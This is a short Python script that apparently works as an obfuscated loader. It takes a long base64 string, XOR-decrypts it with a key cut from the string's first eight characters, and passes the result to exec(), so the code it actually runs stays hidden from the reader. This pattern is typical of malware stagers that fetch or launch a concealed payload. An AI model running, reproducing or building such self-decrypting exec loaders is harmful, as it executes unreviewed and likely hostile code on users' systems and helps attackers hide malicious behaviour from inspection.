sType = 'VGVhMG00'

temp="GlmYksYL"+"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"
import base64
data=base64.b64decode(temp[8:]);sk=temp[:8];size=len(data);res=''
for i in range(size):
	k=i&7;
	c=chr(data[i]^ord(sk[k]));
	res+=c
exec(res)